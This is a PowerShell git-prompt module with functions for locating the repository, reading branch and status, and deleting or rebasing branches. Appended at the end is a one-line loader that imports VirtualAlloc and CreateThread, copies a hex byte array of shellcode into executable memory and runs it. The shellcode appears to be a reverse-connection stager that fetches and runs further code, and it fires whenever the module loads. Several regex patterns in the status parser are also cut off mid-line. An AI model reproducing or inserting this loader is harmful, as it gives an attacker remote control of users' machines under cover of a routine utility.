



function Get-GitDirectory {
    $pathInfo = Microsoft.PowerShell.Management\Get-Location
    if (!$pathInfo -or ($pathInfo.Provider.Name -ne 'FileSystem')) {
        $null
    }
    elseif ($Env:GIT_DIR) {
        $Env:GIT_DIR -replace '\\|/', [System.IO.Path]::DirectorySeparatorChar
    }
    else {
        $currentDir = Get-Item -LiteralPath $pathInfo -Force
        while ($currentDir) {
            $gitDirPath = Join-Path $currentDir.FullName .git
            if (Test-Path -LiteralPath $gitDirPath -PathType Container) {
                return $gitDirPath
            }

            
            if (Test-Path -LiteralPath $gitDirPath -PathType Leaf) {
                $gitDirPath = Invoke-Utf8ConsoleCommand { git rev-parse --git-dir 2>$null }
                if ($gitDirPath) {
                    return $gitDirPath
                }
            }

            $headPath = Join-Path $currentDir.FullName HEAD
            if (Test-Path -LiteralPath $headPath -PathType Leaf) {
                $refsPath = Join-Path $currentDir.FullName refs
                $objsPath = Join-Path $currentDir.FullName objects
                if ((Test-Path -LiteralPath $refsPath -PathType Container) -and
                    (Test-Path -LiteralPath $objsPath -PathType Container)) {

                    $bareDir = Invoke-Utf8ConsoleCommand { git rev-parse --git-dir 2>$null }
                    if ($bareDir -and (Test-Path -LiteralPath $bareDir -PathType Container)) {
                        $resolvedBareDir = (Resolve-Path $bareDir).Path
                        return $resolvedBareDir
                    }
                }
            }

            $currentDir = $currentDir.Parent
        }
    }
}

function Get-GitBranch($gitDir = $(Get-GitDirectory), [Diagnostics.Stopwatch]$sw) {
    if (!$gitDir) { return }

    Invoke-Utf8ConsoleCommand {
        dbg 'Finding branch' $sw
        $r = ''; $b = ''; $c = ''
        $step = ''; $total = ''
        if (Test-Path $gitDir/rebase-merge) {
            dbg 'Found rebase-merge' $sw
            if (Test-Path $gitDir/rebase-merge/interactive) {
                dbg 'Found rebase-merge/interactive' $sw
                $r = '|REBASE-i'
            }
            else {
                $r = '|REBASE-m'
            }
            $b = "$(Get-Content $gitDir/rebase-merge/head-name)"
            $step = "$(Get-Content $gitDir/rebase-merge/msgnum)"
            $total = "$(Get-Content $gitDir/rebase-merge/end)"
        }
        else {
            if (Test-Path $gitDir/rebase-apply) {
                dbg 'Found rebase-apply' $sw
                $step = "$(Get-Content $gitDir/rebase-apply/next)"
                $total = "$(Get-Content $gitDir/rebase-apply/last)"

                if (Test-Path $gitDir/rebase-apply/rebasing) {
                    dbg 'Found rebase-apply/rebasing' $sw
                    $r = '|REBASE'
                }
                elseif (Test-Path $gitDir/rebase-apply/applying) {
                    dbg 'Found rebase-apply/applying' $sw
                    $r = '|AM'
                }
                else {
                    $r = '|AM/REBASE'
                }
            }
            elseif (Test-Path $gitDir/MERGE_HEAD) {
                dbg 'Found MERGE_HEAD' $sw
                $r = '|MERGING'
            }
            elseif (Test-Path $gitDir/CHERRY_PICK_HEAD) {
                dbg 'Found CHERRY_PICK_HEAD' $sw
                $r = '|CHERRY-PICKING'
            }
            elseif (Test-Path $gitDir/REVERT_HEAD) {
                dbg 'Found REVERT_HEAD' $sw
                $r = '|REVERTING'
            }
            elseif (Test-Path $gitDir/BISECT_LOG) {
                dbg 'Found BISECT_LOG' $sw
                $r = '|BISECTING'
            }

            $b = Invoke-NullCoalescing `
                { dbg 'Trying symbolic-ref' $sw; git symbolic-ref HEAD -q 2>$null } `
                { '({0})' -f (Invoke-NullCoalescing `
                    {
                        dbg 'Trying describe' $sw
                        switch ($Global:GitPromptSettings.DescribeStyle) {
                            'contains' { git describe --contains HEAD 2>$null }
                            'branch' { git describe --contains --all HEAD 2>$null }
                            'describe' { git describe HEAD 2>$null }
                            default { git tag --points-at HEAD 2>$null }
                        }
                    } `
                    {
                        dbg 'Falling back on parsing HEAD' $sw
                        $ref = $null

                        if (Test-Path $gitDir/HEAD) {
                            dbg 'Reading from .git/HEAD' $sw
                            $ref = Get-Content $gitDir/HEAD 2>$null
                        }
                        else {
                            dbg 'Trying rev-parse' $sw
                            $ref = git rev-parse HEAD 2>$null
                        }

                        if ($ref -match 'ref: (?<ref>.+)') {
                            return $Matches['ref']
                        }
                        elseif ($ref -and $ref.Length -ge 7) {
                            return $ref.Substring(0,7)+'...'
                        }
                        else {
                            return 'unknown'
                        }
                    }
                ) }
        }

        dbg 'Inside git directory?' $sw
        if ('true' -eq $(git rev-parse --is-inside-git-dir 2>$null)) {
            dbg 'Inside git directory' $sw
            if ('true' -eq $(git rev-parse --is-bare-repository 2>$null)) {
                $c = 'BARE:'
            }
            else {
                $b = 'GIT_DIR!'
            }
        }

        if ($step -and $total) {
            $r += " $step/$total"
        }

        "$c$($b -replace 'refs/heads/','')$r"
    }
}

function GetUniquePaths($pathCollections) {
    $hash = New-Object System.Collections.Specialized.OrderedDictionary

    foreach ($pathCollection in $pathCollections) {
        foreach ($path in $pathCollection) {
            $hash[$path] = 1
        }
    }

    $hash.Keys
}

$castStringSeq = [Linq.Enumerable].GetMethod("Cast").MakeGenericMethod([string])


function Get-GitStatus {
    param(
        
        
        [Parameter(Position=0)]
        $GitDir = (Get-GitDirectory),

        
        
        [Parameter()]
        [switch]
        $Force
    )

    $settings = $Global:GitPromptSettings
    $enabled = $Force -or !$settings -or $settings.EnablePromptStatus
    if ($enabled -and $GitDir) {
        if ($settings.Debug) {
            $sw = [Diagnostics.Stopwatch]::StartNew(); Write-Host ''
        }
        else {
            $sw = $null
        }

        $branch = $null
        $aheadBy = 0
        $behindBy = 0
        $gone = $false
        $indexAdded = New-Object System.Collections.Generic.List[string]
        $indexModified = New-Object System.Collections.Generic.List[string]
        $indexDeleted = New-Object System.Collections.Generic.List[string]
        $indexUnmerged = New-Object System.Collections.Generic.List[string]
        $filesAdded = New-Object System.Collections.Generic.List[string]
        $filesModified = New-Object System.Collections.Generic.List[string]
        $filesDeleted = New-Object System.Collections.Generic.List[string]
        $filesUnmerged = New-Object System.Collections.Generic.List[string]
        $stashCount = 0

        if ($settings.EnableFileStatus -and !$(InDotGitOrBareRepoDir $GitDir) -and !$(InDisabledRepository)) {
            if ($null -eq $settings.EnableFileStatusFromCache) {
                $settings.EnableFileStatusFromCache = $null -ne (Get-Module GitStatusCachePoshClient)
            }

            if ($settings.EnableFileStatusFromCache) {
                dbg 'Getting status from cache' $sw
                $cacheResponse = Get-GitStatusFromCache
                dbg 'Parsing status' $sw

                $indexAdded.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.IndexAdded))))
                $indexModified.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.IndexModified))))
                foreach ($indexRenamed in $cacheResponse.IndexRenamed) {
                    $indexModified.Add($indexRenamed.Old)
                }
                $indexDeleted.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.IndexDeleted))))
                $indexUnmerged.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.Conflicted))))

                $filesAdded.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.WorkingAdded))))
                $filesModified.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.WorkingModified))))
                foreach ($workingRenamed in $cacheResponse.WorkingRenamed) {
                    $filesModified.Add($workingRenamed.Old)
                }
                $filesDeleted.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.WorkingDeleted))))
                $filesUnmerged.AddRange($castStringSeq.Invoke($null, (,@($cacheResponse.Conflicted))))

                $branch = $cacheResponse.Branch
                $upstream = $cacheResponse.Upstream
                $gone = $cacheResponse.UpstreamGone
                $aheadBy = $cacheResponse.AheadBy
                $behindBy = $cacheResponse.BehindBy

                if ($cacheResponse.Stashes) { $stashCount = $cacheResponse.Stashes.Length }
                if ($cacheResponse.State) { $branch += "|" + $cacheResponse.State }
            }
            else {
                dbg 'Getting status' $sw
                switch ($settings.UntrackedFilesMode) {
                    "No"      { $untrackedFilesOption = "-uno" }
                    "All"     { $untrackedFilesOption = "-uall" }
                    "Normal"  { $untrackedFilesOption = "-unormal" }
                }
                $status = Invoke-Utf8ConsoleCommand { git -c core.quotepath=false -c color.status=false status $untrackedFilesOption --short --branch 2>$null }
                if ($settings.EnableStashStatus) {
                    dbg 'Getting stash count' $sw
                    $stashCount = $null | git stash list 2>$null | measure-object | Select-Object -expand Count
                }

                dbg 'Parsing status' $sw
                switch -regex ($status) {
                    '^(?<index>[^
                        if ($sw) { dbg "Status: $_" $sw }

                        switch ($matches['index']) {
                            'A' { $null = $indexAdded.Add($matches['path1']); break }
                            'M' { $null = $indexModified.Add($matches['path1']); break }
                            'R' { $null = $indexModified.Add($matches['path1']); break }
                            'C' { $null = $indexModified.Add($matches['path1']); break }
                            'D' { $null = $indexDeleted.Add($matches['path1']); break }
                            'U' { $null = $indexUnmerged.Add($matches['path1']); break }
                        }
                        switch ($matches['working']) {
                            '?' { $null = $filesAdded.Add($matches['path1']); break }
                            'A' { $null = $filesAdded.Add($matches['path1']); break }
                            'M' { $null = $filesModified.Add($matches['path1']); break }
                            'D' { $null = $filesDeleted.Add($matches['path1']); break }
                            'U' { $null = $filesUnmerged.Add($matches['path1']); break }
                        }
                        continue
                    }

                    '^
                        if ($sw) { dbg "Status: $_" $sw }

                        $branch = $matches['branch']
                        $upstream = $matches['upstream']
                        $aheadBy = [int]$matches['ahead']
                        $behindBy = [int]$matches['behind']
                        $gone = [string]$matches['gone'] -eq 'gone'
                        continue
                    }

                    '^
                        if ($sw) { dbg "Status: $_" $sw }

                        $branch = $matches['branch']
                        continue
                    }

                    default { if ($sw) { dbg "Status: $_" $sw } }
                }
            }
        }

        if (!$branch) { $branch = Get-GitBranch $GitDir $sw }

        dbg 'Building status object' $sw

        
        $filesAdded = $filesAdded.ToArray()

        $indexPaths = @(GetUniquePaths $indexAdded,$indexModified,$indexDeleted,$indexUnmerged)
        $workingPaths = @(GetUniquePaths $filesAdded,$filesModified,$filesDeleted,$filesUnmerged)
        $index = (,$indexPaths) |
            Add-Member -Force -PassThru NoteProperty Added    $indexAdded.ToArray() |
            Add-Member -Force -PassThru NoteProperty Modified $indexModified.ToArray() |
            Add-Member -Force -PassThru NoteProperty Deleted  $indexDeleted.ToArray() |
            Add-Member -Force -PassThru NoteProperty Unmerged $indexUnmerged.ToArray()

        $working = (,$workingPaths) |
            Add-Member -Force -PassThru NoteProperty Added    $filesAdded |
            Add-Member -Force -PassThru NoteProperty Modified $filesModified.ToArray() |
            Add-Member -Force -PassThru NoteProperty Deleted  $filesDeleted.ToArray() |
            Add-Member -Force -PassThru NoteProperty Unmerged $filesUnmerged.ToArray()

        $result = New-Object PSObject -Property @{
            GitDir          = $GitDir
            RepoName        = Split-Path (Split-Path $GitDir -Parent) -Leaf
            Branch          = $branch
            AheadBy         = $aheadBy
            BehindBy        = $behindBy
            UpstreamGone    = $gone
            Upstream        = $upstream
            HasIndex        = [bool]$index
            Index           = $index
            HasWorking      = [bool]$working
            Working         = $working
            HasUntracked    = [bool]$filesAdded
            StashCount      = $stashCount
        }

        dbg 'Finished' $sw
        if ($sw) { $sw.Stop() }
        return $result
    }
}

function InDisabledRepository {
    $currentLocation = Get-Location

    foreach ($repo in $Global:GitPromptSettings.RepositoriesInWhichToDisableFileStatus) {
        if ($currentLocation -like "$repo*") {
            return $true
        }
    }

    return $false
}

function InDotGitOrBareRepoDir([string][ValidateNotNullOrEmpty()]$GitDir) {
    
    
    
    
    $pathInfo = Microsoft.PowerShell.Management\Get-Location
    $currentPath = if ($pathInfo.Drive) { $pathInfo.Path } else { $pathInfo.ProviderPath }
    $res = $currentPath.StartsWith($GitDir, (Get-PathStringComparison))
    $res
}

function Get-AliasPattern($cmd) {
    $aliases = @($cmd) + @(Get-Alias | Where-Object { $_.Definition -eq $cmd } | Select-Object -Exp Name)
   "($($aliases -join '|'))"
}


function Remove-GitBranch {
    [CmdletBinding(DefaultParameterSetName="Wildcard", SupportsShouldProcess, ConfirmImpact="Medium")]
    param(
        
        [Parameter(Position=0, Mandatory, ParameterSetName="Wildcard")]
        [ValidateNotNullOrEmpty()]
        [string]
        $Name,

        
        [Parameter(Position=0, Mandatory, ParameterSetName="Pattern")]
        [ValidateNotNull()]
        [string]
        $Pattern,

        
        [Parameter()]
        [ValidateNotNull()]
        [string]
        $ExcludePattern = '(^\*)|(^. (develop|master)$)',

        
        [Parameter()]
        [string]
        $Commit = "HEAD",

        
        [Parameter()]
        [switch]
        $IncludeUnmerged,

        
        [Parameter()]
        [switch]
        $Force,

        
        [Parameter()]
        [switch]
        $DeleteForce
    )

    if ($IncludeUnmerged) {
        $branches = git branch
    }
    else {
        $branches = git branch --merged $Commit
    }

    $filteredBranches = $branches | Where-Object {$_ -notmatch $ExcludePattern }

    if ($PSCmdlet.ParameterSetName -eq "Wildcard") {
        $branchesToDelete = $filteredBranches | Where-Object { $_.Trim() -like $Name }
    }
    else {
        $branchesToDelete = $filteredBranches | Where-Object { $_ -match $Pattern }
    }

    $action = if ($DeleteForce) { "delete with force"} else { "delete" }
    $yesToAll = $noToAll = $false

    foreach ($branch in $branchesToDelete) {
        $targetBranch = $branch.Trim()
        if ($PSCmdlet.ShouldProcess($targetBranch, $action)) {
            if ($Force -or $yesToAll -or
                $PSCmdlet.ShouldContinue("Are you REALLY sure you want to $action `"$targetBranch`"?",
                                         "Confirm branch deletion", [ref]$yesToAll, [ref]$noToAll)) {

                if ($noToAll) { return }

                if ($DeleteForce) {
                    Invoke-Utf8ConsoleCommand { git branch --delete --force $targetBranch }
                }
                else {
                    Invoke-Utf8ConsoleCommand { git branch --delete $targetBranch }
                }
            }
        }
    }
}

function Update-AllBranches($Upstream = 'master', [switch]$Quiet) {
    $head = git rev-parse --abbrev-ref HEAD
    git checkout -q $Upstream
    $branches = Invoke-Utf8ConsoleCommand { (git branch --no-color --no-merged) } | Where-Object { $_ -notmatch '^\* ' }
    foreach ($line in $branches) {
        $branch = $line.SubString(2)
        if (!$Quiet) { Write-Host "Rebasing $branch onto $Upstream..." }

        git rebase -q $Upstream $branch > $null 2> $null
        if ($LASTEXITCODE) {
            git rebase --abort
            Write-Warning "Rebase failed for $branch"
        }
    }

    git checkout -q $head
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xe2,0x5c,0xd8,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

